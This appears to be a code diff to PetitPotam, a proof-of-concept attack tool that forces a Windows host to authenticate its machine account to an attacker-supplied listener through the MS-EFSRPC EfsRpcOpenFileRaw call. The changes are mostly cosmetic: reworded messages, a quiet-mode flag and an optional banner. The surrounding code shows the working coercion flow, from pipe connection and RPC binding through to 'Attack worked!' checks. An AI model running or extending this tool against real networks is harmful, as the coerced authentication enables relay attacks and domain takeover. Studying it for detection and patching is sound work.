@@ -356,15 +356,14 @@ class CoerceAuth():
         try:
             dce.connect()
         except Exception as e:
-            print("Something went wrong, check error status => %s" % str(e))  
-            #sys.exit()
+            print("[!] Something went wrong, check error status => %s" % str(e))
             return
         print("[+] Connected!")
         print("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
         try:
             dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
         except Exception as e:
-            print("Something went wrong, check error status => %s" % str(e)) 
+            print("[!] Something went wrong, check error status => %s" % str(e))
             #sys.exit()
             return
         print("[+] Successfully bound!")
@@ -383,7 +382,6 @@ class CoerceAuth():
             if str(e).find('ERROR_BAD_NETPATH') >= 0:
                 print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                 print('[+] Attack worked!')
-                #sys.exit()
                 return None
             if str(e).find('rpc_s_access_denied') >= 0:
                 print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
@@ -399,14 +397,12 @@ class CoerceAuth():
                         print('[+] Attack worked!')
                         pass
                     else:
-                        print("Something went wrong, check error status => %s" % str(e)) 
+                        print("[!] Something went wrong, check error status => %s" % str(e))
                         return None
-                        #sys.exit()
                 
             else:
-                print("Something went wrong, check error status => %s" % str(e)) 
+                print("[!] Something went wrong, check error status => %s" % str(e))
                 return None
-                #sys.exit()
 
 def main():
     parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
@@ -414,6 +410,7 @@ def main():
     parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
     parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
     parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
+    parser.add_argument('-q', dest='quiet', default=False, action="store_true", help='Quiet mode')
 
     parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
     parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
@@ -436,7 +433,8 @@ def main():
         lmhash = ''
         nthash = ''
 
-    print(show_banner)
+    if not options.quiet:
+        print(show_banner)
 
     if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
         from getpass import getpass
@@ -450,7 +448,7 @@ def main():
         all_pipes = [options.pipe]
     
     for all_pipe in all_pipes:
-        print("Trying pipe", all_pipe)
+        print("[>] Trying pipe %s" % all_pipe)
         dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=all_pipe, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
         if dce is not None:
             plop.EfsRpcOpenFileRaw(dce, options.listener)
